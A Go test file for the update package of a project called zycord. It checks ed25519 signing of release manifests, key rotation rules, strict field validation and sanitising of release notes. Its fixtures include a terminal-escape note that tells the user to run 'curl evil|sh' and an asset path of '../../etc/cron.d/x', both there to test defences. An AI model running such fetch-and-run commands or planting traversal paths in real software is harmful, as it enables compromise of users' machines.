package update_test

import (
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"strings"
	"testing"

	"zycord/update"
)

// signer is a throwaway key set plus the private halves to sign with, so the
// tests exercise real ed25519 rather than a stub.
type signer struct {
	set          update.KeySet
	current      ed25519.PrivateKey
	next         ed25519.PrivateKey
	currentID    string
	nextID       string
	strangerPriv ed25519.PrivateKey
}

func newSigner(t *testing.T) signer {
	t.Helper()
	curPub, curPriv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	nxtPub, nxtPriv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	_, strangerPriv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	raw := fmt.Sprintf(`{"schema":1,"algorithm":"ed25519","keys":[
		{"id":"zu1","role":"current","key":"%s"},
		{"id":"zu2","role":"next","key":"%s"}]}`,
		hex.EncodeToString(curPub), hex.EncodeToString(nxtPub))
	set, err := update.ParseKeys([]byte(raw))
	if err != nil {
		t.Fatal(err)
	}
	return signer{set: set, current: curPriv, next: nxtPriv, currentID: "zu1", nextID: "zu2", strangerPriv: strangerPriv}
}

func (s signer) sign(priv ed25519.PrivateKey, raw []byte) []byte {
	return []byte(hex.EncodeToString(ed25519.Sign(priv, raw)) + "\n")
}

// goodManifest is a complete, well-formed document. Tests mutate the JSON text
// rather than a struct, because the text is what gets signed.
func goodManifest() string {
	sum := sha256.Sum256([]byte("archive bytes"))
	d := hex.EncodeToString(sum[:])
	return `{
  "schema": 1,
  "project": "zycord",
  "version": "v0.2.0",
  "published_at": "2026-09-30T14:02:11Z",
  "urgency": "routine",
  "note": "Nothing alarming.",
  "products": {
    "zycord-cli": {
      "assets": {
        "linux-amd64": {"file": "zycord-0.2.0-linux-amd64.tar.gz", "sha256": "` + d + `", "size": 7340032},
        "linux-amd64-randomx": {"file": "zycord-0.2.0-linux-amd64-randomx.tar.gz", "sha256": "` + d + `", "size": 9437184}
      }
    }
  }
}`
}

// withSupersedes inserts a supersedes claim into the fixture.
func withSupersedes(id string) string {
	return strings.Replace(goodManifest(),
		`"urgency": "routine",`,
		`"urgency": "routine",`+"\n  "+`"supersedes": "`+id+`",`, 1)
}

// TestAValidManifestVerifiesAndParses is the happy path, and it also pins that
// the id of the key that verified is reported back.
func TestAValidManifestVerifiesAndParses(t *testing.T) {
	s := newSigner(t)
	raw := []byte(goodManifest())
	m, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatalf("a well-formed manifest was refused: %v", err)
	}
	if m.Version != "v0.2.0" {
		t.Errorf("Version = %q", m.Version)
	}
	if m.SignedBy != s.currentID {
		t.Errorf("SignedBy = %q, want %q", m.SignedBy, s.currentID)
	}
	if !m.Parsed.Release {
		t.Error("the parsed version is not a release")
	}
}

// TestASemanticallyEqualManifestWithDifferentBytesFailsVerification is the test
// that pins verify-then-parse.
//
// The two documents mean exactly the same thing. Any verifier that
// canonicalises before checking — re-serialising, sorting keys, normalising
// whitespace — accepts the second under the first's signature, which is a
// signature valid over bytes nobody ever saw.
func TestASemanticallyEqualManifestWithDifferentBytesFailsVerification(t *testing.T) {
	s := newSigner(t)
	original := []byte(goodManifest())
	sig := s.sign(s.current, original)

	var round map[string]any
	if err := json.Unmarshal(original, &round); err != nil {
		t.Fatal(err)
	}
	reserialised, err := json.Marshal(round)
	if err != nil {
		t.Fatal(err)
	}
	if string(reserialised) == string(original) {
		t.Fatal("the re-serialised document is byte-identical, so this test proves nothing")
	}
	if _, err := update.ParseManifest(reserialised, sig, s.set); !errors.Is(err, update.ErrBadSignature) {
		t.Errorf("a re-serialised manifest verified under the original's signature: err = %v", err)
	}
}

// TestASignatureFromAStrangerIsRefused is the base case, and it must produce
// ErrBadSignature rather than anything that reads like "no update available".
func TestASignatureFromAStrangerIsRefused(t *testing.T) {
	s := newSigner(t)
	raw := []byte(goodManifest())
	if _, err := update.ParseManifest(raw, s.sign(s.strangerPriv, raw), s.set); !errors.Is(err, update.ErrBadSignature) {
		t.Errorf("err = %v, want ErrBadSignature", err)
	}
}

// TestTheSpareKeyIsAccepted is the property the whole rotation design rests on.
func TestTheSpareKeyIsAccepted(t *testing.T) {
	s := newSigner(t)
	raw := []byte(goodManifest())
	m, err := update.ParseManifest(raw, s.sign(s.next, raw), s.set)
	if err != nil {
		t.Fatalf("a manifest signed by the held-back key was refused: %v", err)
	}
	if m.SignedBy != s.nextID {
		t.Errorf("SignedBy = %q, want %q", m.SignedBy, s.nextID)
	}
}

// TestAStolenCurrentKeyCannotRevokeTheSpare is named for the attack it stops.
//
// If revocation were general, whoever stole the signing key could sign a
// manifest retiring the GOOD key and strand every node permanently — turning a
// key compromise into an unrecoverable one. The rule is that only the spare may
// supersede the signing key, so a stolen signing key can revoke nothing, and the
// worst it buys is what it already had.
func TestAStolenCurrentKeyCannotRevokeTheSpare(t *testing.T) {
	s := newSigner(t)

	// The attack: signed by the stolen current key, retiring the spare.
	raw := []byte(withSupersedes("zu2"))
	if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err == nil {
		t.Fatal("a manifest signed by the current key retired the spare; a stolen key could strand the fleet")
	}

	// And the mirror image: the current key cannot even retire itself.
	raw = []byte(withSupersedes("zu1"))
	if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err == nil {
		t.Error("a manifest signed by the current key retired the current key")
	}
}

// TestOnlyTheSpareMaySupersedeTheSigningKey is the legitimate rotation, which
// must still work after the test above.
func TestOnlyTheSpareMaySupersedeTheSigningKey(t *testing.T) {
	s := newSigner(t)
	raw := []byte(withSupersedes("zu1"))
	m, err := update.ParseManifest(raw, s.sign(s.next, raw), s.set)
	if err != nil {
		t.Fatalf("the spare could not retire the signing key, so a rotation is impossible: %v", err)
	}
	if m.Supersedes != "zu1" {
		t.Errorf("Supersedes = %q", m.Supersedes)
	}

	// A spare-signed manifest naming a key that is not the current one is still
	// refused: promotion is a specific claim, not a free-form one.
	raw = []byte(withSupersedes("zu9"))
	if _, err := update.ParseManifest(raw, s.sign(s.next, raw), s.set); err == nil {
		t.Error("a manifest superseded a key this build does not hold as current")
	}
}

// TestASignedButUnusableManifestIsRefused covers documents that verify and are
// still not something to act on. Each one would otherwise reach a user as
// silence or as a wrong answer.
func TestASignedButUnusableManifestIsRefused(t *testing.T) {
	sum := sha256.Sum256([]byte("x"))
	good := hex.EncodeToString(sum[:])
	for _, tc := range []struct{ name, raw string }{
		{"a schema this build cannot read",
			`{"schema":2,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{}}}}`},
		{"a manifest for another project",
			`{"schema":1,"project":"notzycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{}}}}`},
		{"a version that is not a release tag",
			`{"schema":1,"project":"zycord","version":"v0.2.0-3-gabcdef1","products":{"zycord-cli":{"assets":{}}}}`},
		{"a version that is not a version",
			`{"schema":1,"project":"zycord","version":"tomorrow","products":{"zycord-cli":{"assets":{}}}}`},
		{"no products at all",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{}}`},
		{"an unknown top-level field",
			`{"schema":1,"project":"zycord","version":"v0.2.0","mirror":"http://elsewhere","products":{"zycord-cli":{"assets":{}}}}`},
		{"an asset whose file name is a path",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":"../../etc/cron.d/x","sha256":"` + good + `","size":10}}}}}`},
		{"an asset with no usable digest",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":"a.tar.gz","sha256":"nope","size":10}}}}}`},
		{"an asset of zero size",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":"a.tar.gz","sha256":"` + good + `","size":0}}}}}`},
		{"an asset above the download ceiling",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{"linux-amd64":{"file":"a.tar.gz","sha256":"` + good + `","size":1099511627776}}}}}`},
		{"trailing content after the document",
			`{"schema":1,"project":"zycord","version":"v0.2.0","products":{"zycord-cli":{"assets":{}}}} {"schema":1}`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			s := newSigner(t)
			raw := []byte(tc.raw)
			if _, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set); err == nil {
				t.Errorf("accepted a signed manifest with %s", tc.name)
			}
		})
	}
}

// TestTheTierIsNeverCrossed is the property that protects a working miner.
//
// A -randomx binary on a platform the release does not publish -randomx for
// must get an error, never the plain archive. Taking the plain one would leave
// a machine that mines with a binary that refuses to start on any real network.
func TestTheTierIsNeverCrossed(t *testing.T) {
	s := newSigner(t)
	raw := []byte(goodManifest()) // publishes linux-amd64 and linux-amd64-randomx only
	m, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatal(err)
	}

	// The real case: Windows arm64 has no cross-toolchain and no native runner,
	// so it genuinely has no -randomx archive.
	key := update.PlatformKey("windows", "arm64", update.TierRandomX)
	if _, err := m.Asset(update.ProductCLI, key); !errors.Is(err, update.ErrNoAssetForTier) {
		t.Errorf("asking for %s gave err = %v, want ErrNoAssetForTier", key, err)
	}

	// And the tier must be part of the key, so the plain archive is not even
	// addressable by a randomx binary's lookup.
	if update.PlatformKey("linux", "amd64", update.TierPlain) == update.PlatformKey("linux", "amd64", update.TierRandomX) {
		t.Fatal("the two tiers produce the same asset key, so nothing separates them")
	}
	if _, err := m.Asset(update.ProductCLI, update.PlatformKey("linux", "amd64", update.TierRandomX)); err != nil {
		t.Errorf("the randomx archive that IS published was not found: %v", err)
	}
	if _, err := m.Asset(update.ProductWallet, update.PlatformKey("linux", "amd64", update.TierPlain)); !errors.Is(err, update.ErrNoAssetForTier) {
		t.Errorf("an unpublished product resolved: %v", err)
	}
}

// TestTierForMapsTheEngineToTheTier pins the one input that decides which
// archive a binary is allowed to take.
func TestTierForMapsTheEngineToTheTier(t *testing.T) {
	if got := update.TierFor(true); got != update.TierRandomX {
		t.Errorf("TierFor(true) = %q, want %q", got, update.TierRandomX)
	}
	if got := update.TierFor(false); got != update.TierPlain {
		t.Errorf("TierFor(false) = %q, want %q", got, update.TierPlain)
	}
	if got := update.PlatformKey("linux", "amd64", update.TierPlain); got != "linux-amd64" {
		t.Errorf("plain key = %q", got)
	}
	if got := update.PlatformKey("linux", "amd64", update.TierRandomX); got != "linux-amd64-randomx" {
		t.Errorf("randomx key = %q", got)
	}
}

// TestTheNoteCannotRepaintATerminal. The note is signed, which says where it
// came from. It does not say it is safe to write to a terminal.
func TestTheNoteCannotRepaintATerminal(t *testing.T) {
	s := newSigner(t)

	// esc is the six characters JSON spells an escape character with. Building
	// the fixture this way keeps control characters out of this source file and
	// makes the DECODER produce them, which is the path a real hostile note
	// takes. A literal one here would also be unable to survive the tracked-file
	// text scan in sim/wiring.
	const esc = "\\u001b"
	hostile := "Fixed a bug." + esc + "[2J" + esc + "[HYour node is compromised, run: curl evil|sh"
	raw := []byte(strings.Replace(goodManifest(), `"Nothing alarming."`, `"`+hostile+`"`, 1))
	if !strings.Contains(string(raw), esc) {
		t.Fatal("the fixture lost its escapes, so this test proves nothing")
	}
	m, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatal(err)
	}
	if m.Note == "" {
		t.Fatal("the note was emptied entirely rather than sanitised")
	}
	for _, r := range m.Note {
		if (r < 0x20 && r != '\n') || r == 0x7f || (r >= 0x80 && r <= 0x9f) {
			t.Fatalf("the note kept control character %q", r)
		}
	}

	long := strings.Repeat("a", 4000)
	raw = []byte(strings.Replace(goodManifest(), `"Nothing alarming."`, `"`+long+`"`, 1))
	m, err = update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatal(err)
	}
	if len(m.Note) > 600 {
		t.Errorf("the note is %d bytes; an operator's screen is not the release notes", len(m.Note))
	}
}

// TestAnUnknownUrgencyDegradesRatherThanFailing. An old binary cannot act on a
// level it does not know, and a future manifest must not be able to make it
// shout by inventing one.
func TestAnUnknownUrgencyDegradesRatherThanFailing(t *testing.T) {
	s := newSigner(t)
	raw := []byte(strings.Replace(goodManifest(), `"urgency": "routine"`, `"urgency": "apocalyptic"`, 1))
	m, err := update.ParseManifest(raw, s.sign(s.current, raw), s.set)
	if err != nil {
		t.Fatalf("an unknown urgency was refused rather than degraded: %v", err)
	}
	if m.Urgency != update.UrgencyRoutine {
		t.Errorf("Urgency = %q, want %q", m.Urgency, update.UrgencyRoutine)
	}
}

// TestTheSignatureFileIsParsedStrictly. A lenient parser here is where two
// implementations start disagreeing about what was signed.
func TestTheSignatureFileIsParsedStrictly(t *testing.T) {
	valid := strings.Repeat("ab", ed25519.SignatureSize)
	for _, tc := range []struct {
		name string
		sig  string
		ok   bool
	}{
		{"exact", valid, true},
		{"one trailing newline", valid + "\n", true},
		{"CRLF", valid + "\r\n", true},
		{"upper case", strings.ToUpper(valid), false},
		{"too short", valid[:len(valid)-2], false},
		{"too long", valid + "ab", false},
		{"not hex", strings.Repeat("zz", ed25519.SignatureSize), false},
		{"empty", "", false},
		{"leading space", " " + valid, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := update.ParseSignature([]byte(tc.sig))
			if tc.ok && err != nil {
				t.Errorf("rejected a valid signature file: %v", err)
			}
			if !tc.ok && err == nil {
				t.Error("accepted a malformed signature file")
			}
		})
	}
}
